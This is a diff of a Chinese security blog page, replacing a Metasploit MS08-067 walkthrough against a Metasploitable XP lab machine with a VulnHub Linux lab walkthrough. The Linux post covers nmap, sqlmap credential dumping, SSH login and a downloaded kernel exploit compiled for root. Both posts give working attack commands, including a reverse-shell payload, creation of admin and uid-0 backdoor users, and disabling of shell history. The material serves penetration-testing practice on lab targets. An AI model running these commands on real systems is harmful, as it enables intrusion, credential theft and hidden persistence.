@@ -4,42 +4,49 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>基于Metasploit的简单渗透测试 | Hello_C技术博客</title>
+    <title>一次基于Linux的渗透测试 | Hello_C技术博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Hello_C">
     
 
     
-    <meta name="description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
+    <meta name="description" content="最近发现了一个不错的靶场，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个漏洞利用存档，可以找到很多我们可以利用的学习的东西。 
+0x01 信息搜集
+首先就是确定我们靶机的目标IPnmap -sP -T5 192.168.0.1/24">
 <meta property="og:type" content="article">
-<meta property="og:title" content="基于Metasploit的简单渗透测试">
-<meta property="og:url" content="http://yoursite.com/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html">
+<meta property="og:title" content="一次基于Linux的渗透测试">
+<meta property="og:url" content="http://yoursite.com/渗透/2017/05/18/一次基于Linux的渗透测试.html">
 <meta property="og:site_name" content="Hello_C技术博客">
-<meta property="og:description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
-<meta property="og:image" content="http://p1.bpimg.com/567571/826753312810080e.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/a638f3936515e739.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/96be5eca3ce882a7.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/732dc3a4eae6550e.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/ee09a90f249e897a.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/f662c66695f1fc58.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/5c47668de1bc99a3.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/2b949608e42b51eb.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/2fda087ffd9a4256.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/a7728ce712c626d0.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/bbc3e104976b7066.png">
-<meta property="og:image" content="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg">
-<meta property="og:image" content="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg">
-<meta property="og:updated_time" content="2016-12-08T02:05:05.904Z">
+<meta property="og:description" content="最近发现了一个不错的靶场，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个漏洞利用存档，可以找到很多我们可以利用的学习的东西。 
+0x01 信息搜集
+首先就是确定我们靶机的目标IPnmap -sP -T5 192.168.0.1/24">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/92578056-file_1495024794093_f650.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/29748247-file_1495025167563_18075.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/1901036-file_1495026985555_c687.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/34894438-file_1495026990934_c5e1.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/72915652-file_1495025513089_4b42.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/16907544-file_1495027180453_a40c.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/77969300-file_1495027584527_6db5.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/87595415-file_1495028411853_56b6.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/52436738-file_1495029065698_1762a.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/72043277-file_1495029395412_5b3f.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/40331315-file_1495029419098_1162.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/50127468-file_1495029835183_507e.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/42366405-file_1495083173994_9c37.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/75985467-file_1495083672930_ba2a.jpg">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/61650463-file_1495083646059_acf0.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/73239541-file_1495083911393_12b4.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/40320294-file_1495083992867_f6e7.png">
+<meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-18/23001066-file_1495084882743_12f82.png">
+<meta property="og:updated_time" content="2017-05-18T08:49:06.858Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="基于Metasploit的简单渗透测试">
-<meta name="twitter:description" content="0x00 MetasploitableMetasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。本次测试使用xp系统的靶机，下载地址http://pan.baidu.com/s/1geMxsuJ  密码：xst1
-0x">
-<meta name="twitter:image" content="http://p1.bpimg.com/567571/826753312810080e.png">
+<meta name="twitter:title" content="一次基于Linux的渗透测试">
+<meta name="twitter:description" content="最近发现了一个不错的靶场，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个漏洞利用存档，可以找到很多我们可以利用的学习的东西。 
+0x01 信息搜集
+首先就是确定我们靶机的目标IPnmap -sP -T5 192.168.0.1/24">
+<meta name="twitter:image" content="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png">
 
     
     <link rel="alternative" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml">
@@ -100,14 +107,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html" title="基于Metasploit的简单渗透测试" itemprop="url">基于Metasploit的简单渗透测试</a>
+      <a href="/渗透/2017/05/18/一次基于Linux的渗透测试.html" title="一次基于Linux的渗透测试" itemprop="url">一次基于Linux的渗透测试</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
 		
   <p class="article-time">
-    <time datetime="2016-12-08T01:41:23.000Z" itemprop="datePublished"> 发表于 2016-12-08</time>
+    <time datetime="2017-05-18T07:52:39.000Z" itemprop="datePublished"> 发表于 2017-05-18</time>
     
   </p>
 </header>
@@ -116,70 +123,59 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-Metasploitable"><span class="toc-number">1.</span> <span class="toc-text">0x00 Metasploitable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-查看详细信息"><span class="toc-number">2.</span> <span class="toc-text">0x01 查看详细信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Metasploit的利用"><span class="toc-number"></span> <span class="toc-text">0x02 Metasploit的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-提权"><span class="toc-number">1.</span> <span class="toc-text">0x03 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-补充知识"><span class="toc-number">2.</span> <span class="toc-text">0x04 补充知识</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-信息搜集"><span class="toc-number">1.</span> <span class="toc-text">0x01 信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞发现"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-权限提升"><span class="toc-number">4.</span> <span class="toc-text">0x04 权限提升</span></a></li></ol>
 		
 		</div>
 		
-		<h3 id="0x00-Metasploitable"><a href="#0x00-Metasploitable" class="headerlink" title="0x00 Metasploitable"></a>0x00 Metasploitable</h3><p>Metasploitable漏洞演练系统，基于ubuntu、xp操作系统，本身设计作为安全工具测试和演示常见漏洞攻击，他的作用是用来作为MSF攻击用的靶机,他是一个具有无数未打补丁漏洞与开放了无数高危端口的渗透演练系统，可以使我们进行练习。<br>本次测试使用xp系统的靶机，下载地址<br><a href="http://pan.baidu.com/s/1geMxsuJ" target="_blank" rel="external">http://pan.baidu.com/s/1geMxsuJ</a>  密码：xst1</p>
-<h3 id="0x01-查看详细信息"><a href="#0x01-查看详细信息" class="headerlink" title="0x01 查看详细信息"></a>0x01 查看详细信息</h3><p>使用nmap进行探测发现，使用nmap结合脚本进行扫描测试：<br><a id="more"></a><br>    nmap -sT -A –script=smb-check-vulns -P0 192<br>    -sT 使用TCP Connect扫描<br>    -A 是指高级操作系统探测功能，对一个特定服务进行更深的旗标和指纹攫取<br>    –script=smb-check-vulns 调用smb-check-vulns脚本<br>    -P0 进行更深层次的扫描，不进行主机发现.168.0.146</p>
-<p><img src="http://p1.bpimg.com/567571/826753312810080e.png" alt=""><br><img src="http://p1.bpimg.com/567571/7ca9db29aad66a2b.png" alt=""><br>发现探测出MS08-067漏洞，使用Metasploit进行攻击利用。</p>
-<h2 id="0x02-Metasploit的利用"><a href="#0x02-Metasploit的利用" class="headerlink" title="0x02 Metasploit的利用"></a>0x02 Metasploit的利用</h2><p>2.1 查找 MS08-067相关的模块<br><img src="http://p1.bpimg.com/567571/a638f3936515e739.png" alt=""></p>
-<p>2.2 使用选中的模块并查看<br><img src="http://p1.bpimg.com/567571/96be5eca3ce882a7.png" alt=""></p>
-<pre><code>set TARGET 5
-</code></pre><p>2.2 设置攻击参数<br>show options 查看一下参数，确保无误<br>设置PAYLOAD（攻击载荷）<br>set PAYLOAD windows/meterpreter/reverse_tcp<br>set RHOST 192.168.1.146 设置远程主机IP地址<br>set LHOST 192.168.1.179 设置反向连接地址为本机IP地址<br>set LPORT 55555 设置本机监听的TCP端口号<br>这个载荷在攻击成功后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址。</p>
-<p><img src="http://p1.bpimg.com/567571/307cb59fc9f7f5d8.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/732dc3a4eae6550e.png" alt=""></p>
-<p>2.3 开始攻击，发现已经上钩；</p>
-<p><img src="http://p1.bpimg.com/567571/ee09a90f249e897a.png" alt=""></p>
-<p><img src="http://p1.bpimg.com/567571/f662c66695f1fc58.png" alt=""></p>
-<h3 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h3><p>3.1 查看权限，判断是否需要进行提权</p>
-<blockquote>
-<p>getuid</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/5c47668de1bc99a3.png" alt=""></p>
-<p>3.2 增加用户名并设置为管理员</p>
-<blockquote>
-<p>net user zjw 123 /add<br>net localgroup administrators zjw /add</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/2b949608e42b51eb.png" alt=""><br><img src="http://p1.bqimg.com/567571/2fda087ffd9a4256.png" alt=""><br>3.3 开启3389端口远程登录</p>
-<blockquote>
-<p>run getgui -e </p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/a7728ce712c626d0.png" alt=""><br>3.4 远程连接目标主机</p>
-<blockquote>
-<p>rdesktop -f -a 16 192.168.0.146:3389<br>成功登陆目标主机</p>
-</blockquote>
-<p><img src="http://p1.bqimg.com/567571/bbc3e104976b7066.png" alt=""></p>
-<h3 id="0x04-补充知识"><a href="#0x04-补充知识" class="headerlink" title="0x04 补充知识"></a>0x04 补充知识</h3><p>4.1 拿到shell只是普通用户怎么办？<br>上面演示的直接就是最高权限，当然这种情况在平时渗透测试中也是比较少见的，那么我们就得进行提权了。</p>
-<pre><code>meterpreter &gt; background
-msf exploit(handler) &gt; search ms16
-msf exploit(handler) &gt; use exploit/windows/local/ms16_016_webdav
-msf exploit(ms16_016_webdav) &gt; info
-msf exploit(ms16_016_webdav) &gt; show options
-msf exploit(ms16_016_webdav) &gt; set SESSION 1    # 设置会刚才我们后门连接的ID号 1
-msf exploit(ms16_016_webdav) &gt; exploit
-msf exploit(ms16_016_webdav) &gt; sessions
-msf exploit(ms16_016_webdav) &gt; sessions -i 1
-meterpreter &gt; getuid
-</code></pre><p><img src="http://p1.bpimg.com/567571/a6d950f8675b26b2.jpg" alt=""><br>这是发现我们怎么还是普通权限，我们进行查看进程。然后加载我们的进程号</p>
-<pre><code>meterpreter &gt; ps
-meterpreter &gt; migrate + 进程号
-</code></pre><p><img src="http://p1.bpimg.com/567571/1fb1e2c8eb2603d1.jpg" alt=""><br>这样已经提升为了system权限</p>
-<p>4.2 有时候我们在公网而目标主机在内网如何登陆？<br>这时候就要使用端口转发来实现了，将目标主机的端口转发到我们本机。</p>
-<pre><code>portfwd add -l 你本机的监听端口 -r 127.0.0.1 -p 3389
-</code></pre><p>执行之后所有端口3389的内网流量都会通过这个meterpreter的会话来转发到你kali的127.0.0.1的指定端口上 。<br>假如在这里我设置的监听端口为2222，那么我执行的就是</p>
-<pre><code>portfwd add -l 2222 -r 127.0.0.1 -p 3389
-</code></pre><p>然后开始连接远程桌面。新建一个终端窗口，执行连接Windows远程桌面的命令就OK了。</p>
-<pre><code>rdesktop 127.0.0.1:2222
-</code></pre>  
+		<p>　　最近发现了一个不错的<a href="https://www.vulnhub.com" target="_blank" rel="external">靶场</a>，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个<a href="https://www.exploit-db.com" target="_blank" rel="external">漏洞利用存档</a>，可以找到很多我们可以利用的学习的东西。 </p>
+<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><ul>
+<li>首先就是确定我们靶机的目标IP<br><code>nmap -sP -T5 192.168.0.1/24</code><a id="more"></a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/92578056-file_1495024794093_f650.png" alt=""><br>通过前面的步骤，我们对目标进行具体的端口扫描以及操作系统识别，发现开启有80，22以及6667端口。<br><code>nmap -sV -p- -A -O -T4 192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/29748247-file_1495025167563_18075.png" alt=""> </li>
+<li>目录扫描<br>继续对目标进行敏感目录扫描，御剑等工具都可以。这里我使用KALI的<code>nikto</code>以及<code>dirb</code>命令进行简单的目录扫描。<br><code>nikto -host http://192.168.0.170</code>或者<code>dirb http://192.168.0.170</code></li>
+</ul>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/1901036-file_1495026985555_c687.jpg" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/34894438-file_1495026990934_c5e1.jpg" alt=""></p>
+<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h3><p>　　访问IP之后的页面，发现并没有什么特别的地方，于是只能查看源代码，点击超链接进行查看。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72915652-file_1495025513089_4b42.png" alt=""></p>
+<p>在链接的地方竟然发现了秘密的地方，于是访问之<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/16907544-file_1495027180453_a40c.png" alt=""><br>此处是一个登录界面，我们可以尝试注册一个用户进行登录，但只是一个游客的形式。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/77969300-file_1495027584527_6db5.png" alt=""><br>我们注册一个用户进行登录，还有有很多功能的，于是可以进行更多的尝试。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/87595415-file_1495028411853_56b6.png" alt=""></p>
+<p>　　在下面发现OpenDocMan v1.2.7， OpenDocMan是一个功能完整的基于Web的文档管理系统(DMS)，于是找找OpenDocMan v1.2.7所公布的一些可以利用的<a href="https://www.exploit-db.com/exploits/32075/" target="_blank" rel="external">漏洞</a>。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/52436738-file_1495029065698_1762a.png" alt=""><br>发现可以利用的好几个漏洞，于是先行尝试sql注入。</p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>　　经过简单的测试发现<code>http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user</code>处确实注入。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72043277-file_1495029395412_5b3f.png" alt=""></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/40331315-file_1495029419098_1162.png" alt=""><br>于是直接拿出神器Sqlmap进行注入。<br><code>sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value --dbs</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/50127468-file_1495029835183_507e.png" alt=""><br>经过常见的那几个命令我们可以成功的拿到登录名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs --tables</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_admin --columns</div></pre></td></tr></table></figure></p>
+<p>发现admin表里面没有信息，只能从user表里面提取信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user --columns`</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user -C &quot;username,password&quot; --dump</div></pre></td></tr></table></figure></p>
+<p>我们可以看到已经获取到了数据库的用户名和密码，直接MD5解密就可以ssh登录服务器。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/42366405-file_1495083173994_9c37.png" alt=""><br>用户名<code>webmin</code>，密码<code>b78aae356709f8c31118ea613980954b</code>，明文为<code>webmin</code></p>
+<h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>经过前面端口扫描可以发现，22端口发放着，可以进行ssh连接。<code>ssh webmin@192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/75985467-file_1495083672930_ba2a.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/61650463-file_1495083646059_acf0.png" alt=""><br>　　<br>　　查看权限发现是普通用户的权限，所以得继续进行提权操作。获取到低权限SHELL后我们通常做下面几件事：</p>
+<ul>
+<li>检测操作系统的发行版本</li>
+<li>查看内核版本</li>
+<li>检测当前用户权限</li>
+<li>列举Suid文件</li>
+<li>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</li>
+</ul>
+<p><code>lsb_release -a</code>查看系统的发行版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/73239541-file_1495083911393_12b4.png" alt=""><br><code>uname -a</code>查看内核版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/40320294-file_1495083992867_f6e7.png" alt=""></p>
+<p>　　我们可以看到此操作系统采用的是Ubuntu 14.04.4 LTS，内核版本是3.13.0-24-generic，首先想到的就是去漏洞库寻找有没有可以用的exploit。</p>
+<p>下载漏洞exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget https://www.exploit-db.com/download/37292</div><div class="line">mv 37292 shell.c</div><div class="line">gcc -o shell shell.c</div><div class="line">./shell</div></pre></td></tr></table></figure></p>
+<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/23001066-file_1495084882743_12f82.png" alt=""></p>
+<p><strong>附Linux渗透小技巧：</strong></p>
+<ul>
+<li>bash去掉history记录<br>export HISTSIZE=0<br>export HISTFILE=/dev/null</li>
+<li>Linux添加uid为0的用户<br>useradd -o -u 0 cnbird</li>
+<li>可以翻下 mysql_history .bash_history</li>
+<li>ls -al 看下root目录下都有什么隐藏目录 例如 .ssh .vnc 等</li>
+<li>可以看下 .ssh/下面的ssh连接记录等，也可以看下全局变量文件什么的</li>
+<li>通过webshell反弹shell回来之后获取真正的ttyshell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
+</ul>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/渗透/">渗透</a>
+</div>
+
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/渗透测试/">渗透测试</a><a href="/tags/Metasploit/">Metasploit</a>
+  <span></span> <a href="/tags/渗透测试/">渗透测试</a>
   </div>
 
 </div>
@@ -223,19 +219,11 @@ meterpreter &gt; migrate + 进程号
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/渗透/2016/12/09/Nessus的安装与使用.html" title="Nessus的安装与使用">
-  <strong>上一篇：</strong><br/>
-  <span>
-  Nessus的安装与使用</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/漏洞/2016/11/30/变量覆盖.html"  title="变量覆盖">
+<a href="/CTF/2017/04/29/CTF常见题型.html"  title="CTF常见题型">
  <strong>下一篇：</strong><br/> 
- <span>变量覆盖
+ <span>CTF常见题型
 </span>
 </a>
 </div>
@@ -244,7 +232,7 @@ meterpreter &gt; migrate + 进程号
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html" data-title="基于Metasploit的简单渗透测试" data-url="http://yoursite.com/uncategorized/2016/12/08/基于Metasploit的简单渗透测试.html"></div>
+	<div class="ds-thread" data-thread-key="渗透/2017/05/18/一次基于Linux的渗透测试.html" data-title="一次基于Linux的渗透测试" data-url="http://yoursite.com/渗透/2017/05/18/一次基于Linux的渗透测试.html"></div>
 </section>
 
 
@@ -254,7 +242,7 @@ meterpreter &gt; migrate + 进程号
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-Metasploitable"><span class="toc-number">1.</span> <span class="toc-text">0x00 Metasploitable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-查看详细信息"><span class="toc-number">2.</span> <span class="toc-text">0x01 查看详细信息</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Metasploit的利用"><span class="toc-number"></span> <span class="toc-text">0x02 Metasploit的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-提权"><span class="toc-number">1.</span> <span class="toc-text">0x03 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-补充知识"><span class="toc-number">2.</span> <span class="toc-text">0x04 补充知识</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-信息搜集"><span class="toc-number">1.</span> <span class="toc-text">0x01 信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-漏洞发现"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-权限提升"><span class="toc-number">4.</span> <span class="toc-text">0x04 权限提升</span></a></li></ol>
  
   </div>
 
